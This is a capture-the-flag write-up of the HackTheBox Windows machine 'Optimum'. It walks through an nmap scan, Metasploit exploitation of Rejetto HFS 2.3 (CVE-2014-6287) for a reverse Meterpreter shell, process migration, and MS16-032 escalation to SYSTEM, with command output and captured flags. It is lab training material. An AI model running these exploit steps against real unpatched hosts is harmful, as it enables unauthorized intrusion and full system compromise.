# Optimum: HackTheBox

---

## Metadata

| Field | Details |
| --- | --- |
| **Platform** | HackTheBox |
| **Machine** | Optimum |
| **OS** | Windows |
| **Difficulty** | Easy |
| **Attacker IP** | 10.10.16.36 |
| **Target IP** | 10.129.34.15 |
| **Tools Used** | Nmap, Metasploit (rejetto_hfs_exec, ms16_032_secondary_logon_handle_privesc) |
| **Techniques** | HFS RCE (CVE-2014-6287), Meterpreter Process Migration, Local Kernel Exploit (MS16-032) |
| **CVEs** | CVE-2014-6287, MS16-032 |
| **Date** | June 2026 |

---

## Attack Chain Summary

```
Nmap scan → Port 80 HttpFileServer 2.3 → CVE-2014-6287 RCE →
Metasploit rejetto_hfs_exec → Meterpreter as kostas → User flag →
sysinfo → Windows Server 2012 R2 x64 → Process migration to explorer.exe →
search exploit/windows/local → ms16_032_secondary_logon_handle_privesc →
NT AUTHORITY\SYSTEM → Root flag
```

---

## Step 1: Reconnaissance

**Goal:** Identify open ports and services running on the target.

```
Hackerpatel007_1@htb[/htb]$ nmap -T4 -A -v 10.129.34.15 -oN optimum.nmap
Starting Nmap 7.94 ( https://nmap.org )

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-title: HFS /
|_http-server-header: HFS 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Output Analysis**

| Port | Service | Version | Notes |
| --- | --- | --- | --- |
| 80 | HTTP | HttpFileServer 2.3 | Only open port: single attack surface |

Only one port open. HttpFileServer (HFS) 2.3 by Rejetto is running. A quick search confirms this exact version is vulnerable to remote code execution via CVE-2014-6287: a null byte injection in the search functionality that allows arbitrary command execution without authentication.

---

## Step 2: Exploitation: CVE-2014-6287 (Rejetto HFS RCE)

**Goal:** Exploit the HFS 2.3 RCE vulnerability to obtain a Meterpreter shell.

**Vulnerability:** CVE-2014-6287 affects Rejetto HttpFileServer 2.3 and earlier. The search functionality fails to properly handle null bytes (`%00`) in the query string, allowing an attacker to embed a VBScript command that HFS executes server-side without any authentication required.

A Metasploit module (`exploit/windows/http/rejetto_hfs_exec`) handles this cleanly. A standalone PoC also exists on Exploit-DB (EDB-39161) but requires manual modification to function.

Started Metasploit and configured the module:

```
Hackerpatel007_1@htb[/htb]$ msfconsole -q
msf6 > use exploit/windows/http/rejetto_hfs_exec
msf6 exploit(rejetto_hfs_exec) > set RHOST 10.129.34.15
RHOST => 10.129.34.15
msf6 exploit(rejetto_hfs_exec) > set LHOST 10.10.16.36
LHOST => 10.10.16.36
msf6 exploit(rejetto_hfs_exec) > run
```

Exploit output:

```
[*] Started reverse TCP handler on 10.10.16.36:4444
[*] Using URL: http://0.0.0.0:8080/UVC01lR
[*] Local IP: http://192.168.204.143:8080/UVC01lR
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /UVC01lR
[*] Sending stage (179267 bytes) to 10.129.34.15
[*] Meterpreter session 1 opened (10.10.16.36:4444 -> 10.129.34.15:49240)
[!] Tried to delete %TEMP%\WzZArHdoTouc.vbs, unknown result
[*] Server stopped.

meterpreter > getuid
Server username: OPTIMUM\kostas
```

Meterpreter session obtained as `OPTIMUM\kostas`.

---

## Step 3: User Flag

**Goal:** Locate and capture the user flag.

```
meterpreter > shell
Process 2340 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation.  All rights reserved.

C:\Users\kostas\Desktop> type user.txt.txt
f219826bab47bb7da1e3eabc4540b30f
```

**Flag Breakdown**

| Flag | Value |
| --- | --- |
| User Flag | `f219826bab47bb7da1e3eabc4540b30f` |

---

## Step 4: System Enumeration and Process Migration

**Goal:** Identify the OS architecture and migrate to a compatible 64-bit process before running local exploit suggestions.

```
meterpreter > sysinfo
Computer        : OPTIMUM
OS              : Windows 2012 R2 (6.3 Build 9600)
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
```

The target is **Windows Server 2012 R2 x64**, but the active Meterpreter session is x86 (32-bit). Running the `local_exploit_suggester` or kernel exploits from a 32-bit process on a 64-bit system is unreliable. Migration to a native x64 process is required first.

Listed running processes and identified `explorer.exe` as a stable x64 target:

```
meterpreter > ps

 PID   PPID  Name               Arch  Session  User             Path
 ---   ----  ----               ----  -------  ----             ----
 ...
 2752  2744  explorer.exe       x64   1        OPTIMUM\kostas   C:\Windows\explorer.exe
 ...
```

Migrated into `explorer.exe`:

```
meterpreter > migrate 2752
[*] Migrating from 1804 to 2752...
[*] Migration completed successfully.

meterpreter > sysinfo
Meterpreter     : x64/windows
```

Session is now running as a native x64 process. Local exploit enumeration will be reliable.

---

## Step 5: Local Exploit Enumeration

**Goal:** Identify applicable kernel exploits for Windows Server 2012 R2 x64.

Due to unreliability of `local_exploit_suggester` on x64 systems when migrated from an x86 payload, searched Metasploit's local exploit database directly and cross-referenced against the target build:

```
msf6 > search exploit/windows/local

Matching Modules
================

   #    Name                                                    Disclosure Date  Rank
   ---  ----                                                    ---------------  ----
   ...
   34   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  2016-03-21  excellent
   ...
```

**MS16-032** targets the Windows Secondary Logon Service (`seclogon`): a race condition in the `CreateProcessWithLogonW` API that allows a low-privilege user to obtain a SYSTEM token. The vulnerability affects Windows 7 through Server 2012 R2, all x64 and x86.

Windows Server 2012 R2 build 9600 is confirmed vulnerable.

---

## Step 6: Privilege Escalation: MS16-032

**Goal:** Exploit MS16-032 to escalate from `kostas` to `NT AUTHORITY\SYSTEM`.

Configured and ran the exploit from within the existing Meterpreter session:

```
msf6 > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
msf6 exploit(ms16_032_secondary_logon_handle_privesc) > set SESSION 1
SESSION => 1
msf6 exploit(ms16_032_secondary_logon_handle_privesc) > set LHOST 10.10.16.36
LHOST => 10.10.16.36
msf6 exploit(ms16_032_secondary_logon_handle_privesc) > run
```

Exploit output:

```
[*] Started reverse TCP handler on 10.10.16.36:12344
[*] Writing payload file, C:\Users\kostas\edShkzY.txt...
[*] Compressing script contents...
[+] Compressed size: 3576
[*] Executing exploit script...
[+] Cleaned up C:\Users\kostas\edShkzY.txt
[+] Command shell session 6 opened (10.10.16.36:12344 -> 10.129.34.15:49169)

Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation.  All rights reserved.

C:\Users\kostas> whoami
nt authority\system
```

`NT AUTHORITY\SYSTEM` obtained.

---

## Step 7: Root Flag

**Goal:** Navigate to the Administrator desktop and capture the root flag.

```
C:\Users\kostas> cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop> type root.txt
a17d977439318f154e05050e910af184
```

**Flag Breakdown**

| Flag | Value |
| --- | --- |
| Root Flag | `a17d977439318f154e05050e910af184` |

---

## Lessons Learned

**1. A single exposed service is still a full attack surface.**
Optimum had exactly one open port. The temptation in enumeration is to keep scanning for more. When only one service exists, that service deserves complete focus: version identification, CVE research, and exploitation. HFS 2.3 was immediately searchable and the exploit was publicly documented.

**2. CVE-2014-6287 requires no authentication and no interaction.**
The Rejetto HFS null byte vulnerability exploits the search function of the web interface. No credentials, no upload access, no user interaction needed. Any externally facing HFS instance running version 2.3 or earlier is instantly compromised. Service version enumeration during nmap directly leads to this.

**3. Architecture mismatch causes exploit failures: always verify and migrate.**
The initial Meterpreter payload was x86 landing on a 64-bit system. Running kernel exploits or the local exploit suggester in this mismatched state produces unreliable results. Checking `sysinfo` immediately after gaining a session and migrating to a native x64 process (`explorer.exe`) is a mandatory step on any Windows target before attempting privilege escalation.

**4. MS16-032 is a reliable kernel exploit for unpatched Windows Server 2012 R2.**
The Secondary Logon race condition is a well-understood vulnerability with a high-confidence Metasploit implementation. On systems that predate the March 2016 patch cycle, this exploit is almost always the correct answer when a 64-bit low-privilege shell is in hand. The key is knowing the build number and cross-referencing it against the affected range.

**5. Manual exploit search is more reliable than local_exploit_suggester on x64.**
The `local_exploit_suggester` module has known accuracy issues when the Meterpreter session architecture does not match the system architecture. Running `search exploit/windows/local` and manually reviewing exploits against the OS version and build number is slower but produces more reliable results.

---

## Full Attack Chain Reference

1. Ran `nmap -T4 -A -v`: identified HttpFileServer 2.3 on port 80
2. Researched HFS 2.3: found CVE-2014-6287 (null byte RCE, no auth required)
3. Loaded `exploit/windows/http/rejetto_hfs_exec` in Metasploit
4. Set `RHOST 10.129.34.15` and `LHOST 10.10.16.36`: ran exploit
5. Meterpreter session opened as `OPTIMUM\kostas`
6. Navigated to `C:\Users\kostas\Desktop`: captured user flag
7. Ran `sysinfo`: confirmed Windows Server 2012 R2 x64, session is x86
8. Ran `ps`: identified `explorer.exe` PID running as x64
9. Ran `migrate <PID>`: session promoted to x64/windows
10. Searched `exploit/windows/local`: identified MS16-032 as applicable
11. Loaded `exploit/windows/local/ms16_032_secondary_logon_handle_privesc`
12. Set `SESSION 1` and `LHOST`: ran exploit
13. Command shell opened as `NT AUTHORITY\SYSTEM`
14. Navigated to `C:\Users\Administrator\Desktop`: captured root flag

---

## Commands Reference

| Command | Purpose |
| --- | --- |
| `nmap -T4 -A -v 10.129.34.15 -oN optimum.nmap` | Aggressive scan with version detection and scripts |
| `use exploit/windows/http/rejetto_hfs_exec` | Load HFS RCE module (CVE-2014-6287) |
| `set RHOST 10.129.34.15` | Set target IP |
| `set LHOST 10.10.16.36` | Set attacker IP for reverse shell |
| `run` | Execute exploit: opens Meterpreter session |
| `getuid` | Confirm current user context |
| `sysinfo` | Check OS version and Meterpreter architecture |
| `ps` | List running processes for migration target |
| `migrate <PID>` | Migrate into x64 process for reliable exploit execution |
| `search exploit/windows/local` | Browse local privilege escalation modules |
| `use exploit/windows/local/ms16_032_secondary_logon_handle_privesc` | Load MS16-032 kernel exploit |
| `set SESSION 1` | Attach exploit to existing Meterpreter session |

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
| --- | --- | --- |
| Exploit Public-Facing Application | T1190 | CVE-2014-6287 RCE against HFS 2.3 web interface |
| Command and Scripting Interpreter | T1059.003 | VBScript execution via HFS null byte injection |
| Process Injection / Migration | T1055 | Meterpreter migration from x86 to x64 process |
| Exploitation for Privilege Escalation | T1068 | MS16-032 Secondary Logon race condition → SYSTEM |
